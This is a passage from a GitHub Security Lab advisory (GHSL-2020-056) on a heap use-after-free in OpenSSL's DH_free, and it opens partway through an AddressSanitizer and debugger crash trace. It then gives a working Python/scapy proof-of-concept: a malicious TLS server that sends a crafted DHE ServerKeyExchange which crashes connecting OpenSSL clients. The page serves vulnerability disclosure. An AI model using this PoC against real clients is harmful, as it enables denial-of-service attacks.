    <span class="c">#9 0x1003aa4cc in state_machine statem.c:435</span>
    <span class="c">#10 0x1003a7e86 in ossl_statem_connect statem.c:251</span>
    <span class="c">#11 0x1002ff889 in ssl3_write_bytes rec_layer_s3.c:400</span>
    <span class="c">#12 0x1001bb34c in ssl3_write s3_lib.c:4463</span>
    <span class="c">#13 0x10022f398 in ssl_write_internal ssl_lib.c:2018</span>
    <span class="c">#14 0x10022f8fc in SSL_write ssl_lib.c:2095</span>
    <span class="c">#15 0x1000b4644 in s_client_main s_client.c:2885</span>
    <span class="c">#16 0x1000645a9 in do_cmd openssl.c:486</span>
    <span class="c">#17 0x100062e24 in main openssl.c:299</span>
    <span class="c">#18 0x7fff6bf347fc in start (libdyld.dylib:x86_64+0x1a7fc)</span>
2020-03-27 17:17:59.104592+0100 openssl[44349:2367985]
0x60f00002da40 is located 160 bytes inside of 176-byte region <span class="o">[</span>0x60f00002d9a0,0x60f00002da50<span class="o">)</span>
freed by thread T0 here:
    <span class="c">#0 0x10226e536 in wrap_free (libclang_rt.asan_osx_dynamic.dylib:x86_64h+0x45536)</span>
    <span class="c">#1 0x100be8608 in CRYPTO_free mem.c:252</span>
    <span class="c">#2 0x1008394ac in DH_free dh_lib.c:153</span>
    <span class="c">#3 0x1003e5b9b in tls_process_ske_dhe statem_clnt.c:2179</span>
    <span class="c">#4 0x1003d27ca in tls_process_key_exchange statem_clnt.c:2288</span>
    <span class="c">#5 0x1003c824d in ossl_statem_client_process_message statem_clnt.c:1049</span>
    <span class="c">#6 0x1003add59 in read_state_machine statem.c:637</span>
    <span class="c">#7 0x1003aa4cc in state_machine statem.c:435</span>
    <span class="c">#8 0x1003a7e86 in ossl_statem_connect statem.c:251</span>
    <span class="c">#9 0x1002ff889 in ssl3_write_bytes rec_layer_s3.c:400</span>
    <span class="c">#10 0x1001bb34c in ssl3_write s3_lib.c:4463</span>
    <span class="c">#11 0x10022f398 in ssl_write_internal ssl_lib.c:2018</span>
    <span class="c">#12 0x10022f8fc in SSL_write ssl_lib.c:2095</span>
    <span class="c">#13 0x1000b4644 in s_client_main s_client.c:2885</span>
    <span class="c">#14 0x1000645a9 in do_cmd openssl.c:486</span>
    <span class="c">#15 0x100062e24 in main openssl.c:299</span>
    <span class="c">#16 0x7fff6bf347fc in start (libdyld.dylib:x86_64+0x1a7fc)</span>
2020-03-27 17:17:59.104903+0100 openssl[44349:2367985]
previously allocated by thread T0 here:
    <span class="c">#0 0x10226e3ed in wrap_malloc (libclang_rt.asan_osx_dynamic.dylib:x86_64h+0x453ed)</span>
    <span class="c">#1 0x100be849b in CRYPTO_malloc mem.c:184</span>
    <span class="c">#2 0x100be84d2 in CRYPTO_zalloc mem.c:191</span>
    <span class="c">#3 0x1008375c8 in dh_new_intern dh_lib.c:71</span>
    <span class="c">#4 0x100837592 in DH_new dh_lib.c:55</span>
    <span class="c">#5 0x1003e5230 in tls_process_ske_dhe statem_clnt.c:2103</span>
    <span class="c">#6 0x1003d27ca in tls_process_key_exchange statem_clnt.c:2288</span>
    <span class="c">#7 0x1003c824d in ossl_statem_client_process_message statem_clnt.c:1049</span>
    <span class="c">#8 0x1003add59 in read_state_machine statem.c:637</span>
    <span class="c">#9 0x1003aa4cc in state_machine statem.c:435</span>
    <span class="c">#10 0x1003a7e86 in ossl_statem_connect statem.c:251</span>
    <span class="c">#11 0x1002ff889 in ssl3_write_bytes rec_layer_s3.c:400</span>
    <span class="c">#12 0x1001bb34c in ssl3_write s3_lib.c:4463</span>
    <span class="c">#13 0x10022f398 in ssl_write_internal ssl_lib.c:2018</span>
    <span class="c">#14 0x10022f8fc in SSL_write ssl_lib.c:2095</span>
    <span class="c">#15 0x1000b4644 in s_client_main s_client.c:2885</span>
    <span class="c">#16 0x1000645a9 in do_cmd openssl.c:486</span>
    <span class="c">#17 0x100062e24 in main openssl.c:299</span>
    <span class="c">#18 0x7fff6bf347fc in start (libdyld.dylib:x86_64+0x1a7fc)</span>
2020-03-27 17:17:59.105102+0100 openssl[44349:2367985]
SUMMARY: AddressSanitizer: heap-use-after-free dh_lib.c:133 <span class="k">in </span>DH_free
Shadow bytes around the buggy address:
  0x1c1e00005af0: fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd
  0x1c1e00005b00: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fa fa
  0x1c1e00005b10: fa fa fa fa fa fa 00 00 00 00 00 00 00 00 00 00
  0x1c1e00005b20: 00 00 00 00 00 00 00 00 00 00 00 00 fa fa fa fa
  0x1c1e00005b30: fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd
<span class="o">=&gt;</span>0x1c1e00005b40: fd fd fd fd fd fd fd fd[fd]fd fa fa fa fa fa fa
  0x1c1e00005b50: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x1c1e00005b60: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x1c1e00005b70: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x1c1e00005b80: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x1c1e00005b90: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
Shadow byte legend <span class="o">(</span>one shadow byte represents 8 application bytes<span class="o">)</span>:
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after <span class="k">return</span>:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      <span class="nb">fc
  </span>Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
  Shadow gap:              cc
<span class="o">==</span><span class="nv">44349</span><span class="o">==</span>ABORTING
<span class="o">(</span>lldb<span class="o">)</span> AddressSanitizer report breakpoint hit. Use <span class="s1">'thread info -s'</span> to get extended information about the report.
Process 44349 stopped
<span class="k">*</span> thread <span class="c">#1, queue = 'com.apple.main-thread', stop reason = Use of deallocated memory</span>
    frame <span class="c">#0: 0x0000000102276ad0 libclang_rt.asan_osx_dynamic.dylib`__asan::AsanDie()</span>
libclang_rt.asan_osx_dynamic.dylib<span class="sb">`</span>__asan::AsanDie:
-&gt;  0x102276ad0 &lt;+0&gt;: pushq  %rbp
    0x102276ad1 &lt;+1&gt;: movq   %rsp, %rbp
    0x102276ad4 &lt;+4&gt;: pushq  %rbx
    0x102276ad5 &lt;+5&gt;: pushq  %rax
<span class="o">(</span>lldb<span class="o">)</span> bt
<span class="k">*</span> thread <span class="c">#1, queue = 'com.apple.main-thread', stop reason = Use of deallocated memory</span>
  <span class="k">*</span> frame <span class="c">#0: 0x0000000102276ad0 libclang_rt.asan_osx_dynamic.dylib`__asan::AsanDie()</span>
    frame <span class="c">#1: 0x000000010228d63f libclang_rt.asan_osx_dynamic.dylib`__sanitizer::Die() + 175</span>
    frame <span class="c">#2: 0x000000010227474b libclang_rt.asan_osx_dynamic.dylib`__asan::ScopedInErrorReport::~ScopedInErrorReport() + 411</span>
    frame <span class="c">#3: 0x000000010227401e libclang_rt.asan_osx_dynamic.dylib`__asan::ReportGenericError(unsigned long, unsigned long, unsigned long, unsigned long, bool, unsigned long, unsigned int, bool) + 430</span>
    frame <span class="c">#4: 0x0000000102274c58 libclang_rt.asan_osx_dynamic.dylib`__asan_report_load8 + 40</span>
    frame <span class="c">#5: 0x0000000100838c01 openssl`DH_free(r=0x000060f00002d9a0) at dh_lib.c:133:44</span>
    frame <span class="c">#6: 0x000000010082411e openssl`int_dh_free(pkey=0x00006120000004c0) at dh_ameth.c:52:5</span>
    frame <span class="c">#7: 0x0000000100b3c37b openssl`evp_pkey_free_legacy(x=0x00006120000004c0) at p_lib.c:1168:13</span>
    frame <span class="c">#8: 0x0000000100b3ca7e openssl`evp_pkey_free_it(x=0x00006120000004c0) at p_lib.c:1187:5</span>
    frame <span class="c">#9: 0x0000000100b35f5c openssl`EVP_PKEY_free(x=0x00006120000004c0) at p_lib.c:1210:5</span>
    frame <span class="c">#10: 0x00000001003e5ba8 openssl`tls_process_ske_dhe(s=0x0000624000012100, pkt=0x00007ffeefbfba90, pkey=0x00007ffeefbfb5c0) at statem_clnt.c:2180:5</span>
    frame <span class="c">#11: 0x00000001003d27cb openssl`tls_process_key_exchange(s=0x0000624000012100, pkt=0x00007ffeefbfba90) at statem_clnt.c:2288:14</span>
    frame <span class="c">#12: 0x00000001003c824e openssl`ossl_statem_client_process_message(s=0x0000624000012100, pkt=0x00007ffeefbfba90) at statem_clnt.c:1049:16</span>
    frame <span class="c">#13: 0x00000001003add5a openssl`read_state_machine(s=0x0000624000012100) at statem.c:637:19</span>
    frame <span class="c">#14: 0x00000001003aa4cd openssl`state_machine(s=0x0000624000012100, server=0x00000000) at statem.c:435:21</span>
    frame <span class="c">#15: 0x00000001003a7e87 openssl`ossl_statem_connect(s=0x0000624000012100) at statem.c:251:12</span>
    frame <span class="c">#16: 0x00000001002ff88a openssl`ssl3_write_bytes(s=0x0000624000012100, type=0x00000017, buf_=0x000062500000f100, len=0, written=0x00007ffeefbfd320) at rec_layer_s3.c:400:13</span>
    frame <span class="c">#17: 0x00000001001bb34d openssl`ssl3_write(s=0x0000624000012100, buf=0x000062500000f100, len=0, written=0x00007ffeefbfd320) at s3_lib.c:4463:12</span>
    frame <span class="c">#18: 0x000000010022f399 openssl`ssl_write_internal(s=0x0000624000012100, buf=0x000062500000f100, num=0, written=0x00007ffeefbfd320) at ssl_lib.c:2018:16</span>
    frame <span class="c">#19: 0x000000010022f8fd openssl`SSL_write(s=0x0000624000012100, buf=0x000062500000f100, num=0x00000000) at ssl_lib.c:2095:11</span>
    frame <span class="c">#20: 0x00000001000b4645 openssl`s_client_main(argc=0x00000000, argv=0x00007ffeefbff7e0) at s_client.c:2885:17</span>
    frame <span class="c">#21: 0x00000001000645aa openssl`do_cmd(prog=0x000060f0000004f0, argc=0x00000001, argv=0x00007ffeefbff7e0) at openssl.c:486:16</span>
    frame <span class="c">#22: 0x0000000100062e25 openssl`main(argc=0x00000001, argv=0x00007ffeefbff7e0) at openssl.c:299:15</span>
    frame <span class="c">#23: 0x00007fff6bf347fd libdyld.dylib`start + 1</span>
    frame <span class="c">#24: 0x00007fff6bf347fd libdyld.dylib`start + 1</span>
<span class="o">(</span>lldb<span class="o">)</span>
</code></pre></div></div>

<h3 id="exploit">Exploit</h3>

<p>The following Python script creates a TLS server listening on port 4433 and waits for a client connection to send its (crashing) payload.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># NOTE: Create a certificate pair before running the exploit.
# openssl req -x509 -nodes -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365
</span>
<span class="kn">import</span> <span class="nn">socket</span>
<span class="kn">from</span> <span class="nn">scapy.layers.tls.all</span> <span class="kn">import</span> <span class="n">TLS</span>
<span class="kn">from</span> <span class="nn">scapy.layers.tls.handshake</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="nn">scapy.fields</span> <span class="kn">import</span> <span class="o">*</span>


<span class="k">class</span> <span class="nc">DHEParams</span><span class="p">(</span><span class="n">Packet</span><span class="p">):</span>
    <span class="n">name</span> <span class="o">=</span> <span class="s">"DHEParams"</span>
    <span class="n">fields_desc</span> <span class="o">=</span> <span class="p">[</span>
        <span class="n">FieldLenField</span><span class="p">(</span><span class="s">"prime_len"</span><span class="p">,</span> <span class="bp">None</span><span class="p">,</span> <span class="n">length_of</span><span class="o">=</span><span class="s">"prime"</span><span class="p">),</span>
        <span class="n">StrLenField</span><span class="p">(</span><span class="s">"prime"</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="n">length_from</span><span class="o">=</span><span class="k">lambda</span> <span class="n">pkt</span><span class="p">:</span> <span class="n">pkt</span><span class="p">.</span><span class="n">prime_len</span><span class="p">),</span>

        <span class="n">FieldLenField</span><span class="p">(</span><span class="s">"generator_len"</span><span class="p">,</span> <span class="bp">None</span><span class="p">,</span> <span class="n">length_of</span><span class="o">=</span><span class="s">"generator"</span><span class="p">),</span>
        <span class="n">StrLenField</span><span class="p">(</span><span class="s">"generator"</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span>
                    <span class="n">length_from</span><span class="o">=</span><span class="k">lambda</span> <span class="n">pkt</span><span class="p">:</span> <span class="n">pkt</span><span class="p">.</span><span class="n">generator_len</span><span class="p">),</span>

        <span class="n">FieldLenField</span><span class="p">(</span><span class="s">"pub_key_len"</span><span class="p">,</span> <span class="bp">None</span><span class="p">,</span> <span class="n">length_of</span><span class="o">=</span><span class="s">"pub_key"</span><span class="p">),</span>
        <span class="n">StrLenField</span><span class="p">(</span><span class="s">"pub_key"</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="n">length_from</span><span class="o">=</span><span class="k">lambda</span> <span class="n">pkt</span><span class="p">:</span> <span class="n">pkt</span><span class="p">.</span><span class="n">pub_key_len</span><span class="p">)</span>
    <span class="p">]</span>


<span class="k">try</span><span class="p">:</span>
    <span class="n">serversocket</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
    <span class="n">serversocket</span><span class="p">.</span><span class="n">setsockopt</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">SOL_SOCKET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SO_REUSEADDR</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>

    <span class="n">serversocket</span><span class="p">.</span><span class="n">bind</span><span class="p">((</span><span class="s">"localhost"</span><span class="p">,</span> <span class="mi">4433</span><span class="p">))</span>
    <span class="n">serversocket</span><span class="p">.</span><span class="n">listen</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>

    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
        <span class="p">(</span><span class="n">clientsocket</span><span class="p">,</span> <span class="n">address</span><span class="p">)</span> <span class="o">=</span> <span class="n">serversocket</span><span class="p">.</span><span class="n">accept</span><span class="p">()</span>

        <span class="k">print</span><span class="p">(</span><span class="s">"Got connection: %r-%r"</span> <span class="o">%</span> <span class="p">(</span><span class="n">clientsocket</span><span class="p">,</span> <span class="n">address</span><span class="p">))</span>

        <span class="n">clientsocket</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4096</span> <span class="o">*</span> <span class="mi">32</span><span class="p">)</span>

        <span class="n">cert</span> <span class="o">=</span> <span class="n">Cert</span><span class="p">(</span><span class="s">"cert.pem"</span><span class="p">)</span>

        <span class="c1"># Small key to trigger a SSL_R_DH_KEY_TOO_SMALL (openssl dhparam -C -check 512).
</span>        <span class="n">dh_p</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">([</span>
            <span class="mh">0xAF</span><span class="p">,</span> <span class="mh">0x73</span><span class="p">,</span> <span class="mh">0x3D</span><span class="p">,</span> <span class="mh">0x2C</span><span class="p">,</span> <span class="mh">0xC6</span><span class="p">,</span> <span class="mh">0xAA</span><span class="p">,</span> <span class="mh">0x42</span><span class="p">,</span> <span class="mh">0xD4</span><span class="p">,</span> <span class="mh">0xF2</span><span class="p">,</span> <span class="mh">0xE6</span><span class="p">,</span> <span class="mh">0xFF</span><span class="p">,</span> <span class="mh">0x94</span><span class="p">,</span>
            <span class="mh">0xD6</span><span class="p">,</span> <span class="mh">0x7A</span><span class="p">,</span> <span class="mh">0xDE</span><span class="p">,</span> <span class="mh">0x8C</span><span class="p">,</span> <span class="mh">0xEC</span><span class="p">,</span> <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0x47</span><span class="p">,</span> <span class="mh">0x3A</span><span class="p">,</span> <span class="mh">0x3C</span><span class="p">,</span> <span class="mh">0x6B</span><span class="p">,</span> <span class="mh">0x37</span><span class="p">,</span> <span class="mh">0xAF</span><span class="p">,</span>
            <span class="mh">0x02</span><span class="p">,</span> <span class="mh">0xBF</span><span class="p">,</span> <span class="mh">0xB9</span><span class="p">,</span> <span class="mh">0xA5</span><span class="p">,</span> <span class="mh">0x9D</span><span class="p">,</span> <span class="mh">0x51</span><span class="p">,</span> <span class="mh">0x86</span><span class="p">,</span> <span class="mh">0xC1</span><span class="p">,</span> <span class="mh">0x7E</span><span class="p">,</span> <span class="mh">0x45</span><span class="p">,</span> <span class="mh">0x7C</span><span class="p">,</span> <span class="mh">0x39</span><span class="p">,</span>
            <span class="mh">0xEE</span><span class="p">,</span> <span class="mh">0x5B</span><span class="p">,</span> <span class="mh">0x4C</span><span class="p">,</span> <span class="mh">0xAA</span><span class="p">,</span> <span class="mh">0xF3</span><span class="p">,</span> <span class="mh">0x36</span><span class="p">,</span> <span class="mh">0x9C</span><span class="p">,</span> <span class="mh">0xF0</span><span class="p">,</span> <span class="mh">0xD4</span><span class="p">,</span> <span class="mh">0xF6</span><span class="p">,</span> <span class="mh">0x96</span><span class="p">,</span> <span class="mh">0x98</span><span class="p">,</span>
            <span class="mh">0xF4</span><span class="p">,</span> <span class="mh">0xE0</span><span class="p">,</span> <span class="mh">0x51</span><span class="p">,</span> <span class="mh">0x4B</span><span class="p">,</span> <span class="mh">0x62</span><span class="p">,</span> <span class="mh">0x39</span><span class="p">,</span> <span class="mh">0x56</span><span class="p">,</span> <span class="mh">0x5A</span><span class="p">,</span> <span class="mh">0x58</span><span class="p">,</span> <span class="mh">0xB8</span><span class="p">,</span> <span class="mh">0xD1</span><span class="p">,</span> <span class="mh">0x81</span><span class="p">,</span>
            <span class="mh">0xD6</span><span class="p">,</span> <span class="mh">0x1E</span><span class="p">,</span> <span class="mh">0x6B</span><span class="p">,</span> <span class="mh">0x2B</span>
        <span class="p">])</span>

        <span class="n">dh_g</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">([</span><span class="mh">0x02</span><span class="p">])</span>
        <span class="n">dh_Ys</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"GOOSE"</span>

        <span class="c1"># Fill our params.
</span>        <span class="n">params</span> <span class="o">=</span> <span class="n">DHEParams</span><span class="p">(</span><span class="n">prime</span><span class="o">=</span><span class="n">dh_p</span><span class="p">,</span> <span class="n">generator</span><span class="o">=</span><span class="n">dh_g</span><span class="p">,</span> <span class="n">pub_key</span><span class="o">=</span><span class="n">dh_Ys</span><span class="p">)</span>

        <span class="c1"># Choose DHE-RSA-CHACHA20-POLY1305 as our cipher.
</span>        <span class="n">response</span> <span class="o">=</span> <span class="n">TLSServerHello</span><span class="p">(</span><span class="n">version</span><span class="o">=</span><span class="mh">0x0303</span><span class="p">,</span> <span class="n">cipher</span><span class="o">=</span><span class="mh">0xccaa</span><span class="p">)</span> <span class="o">/</span> \
            <span class="n">TLSCertificate</span><span class="p">(</span><span class="n">certs</span><span class="o">=</span><span class="p">[</span><span class="n">cert</span><span class="p">])</span> <span class="o">/</span> \
            <span class="n">TLSServerKeyExchange</span><span class="p">(</span><span class="n">params</span><span class="o">=</span><span class="p">[</span><span class="n">params</span><span class="p">])</span> <span class="o">/</span> \
            <span class="n">TLSServerHelloDone</span><span class="p">()</span>

        <span class="n">clientsocket</span><span class="p">.</span><span class="n">sendall</span><span class="p">(</span><span class="n">raw</span><span class="p">(</span><span class="n">TLS</span><span class="p">(</span><span class="n">msg</span><span class="o">=</span><span class="n">response</span><span class="p">)))</span>
        <span class="n">clientsocket</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>

    <span class="n">serversocket</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>

<span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"Got exception: %r"</span> <span class="o">%</span> <span class="n">e</span><span class="p">)</span>
    <span class="k">raise</span> <span class="n">e</span>
</code></pre></div></div>

<h2 id="credit">Credit</h2>

<p>This issue was discovered and reported by GHSL team member <a href="https://github.com/agustingianni">@agustingianni (Agustin Gianni)</a>.</p>

<h2 id="contact">Contact</h2>

<p>You can contact the GHSL team at <code class="language-plaintext highlighter-rouge">securitylab@github.com</code>, please include <code class="language-plaintext highlighter-rouge">GHSL-2020-056</code> in any communication regarding this issue.</p>

    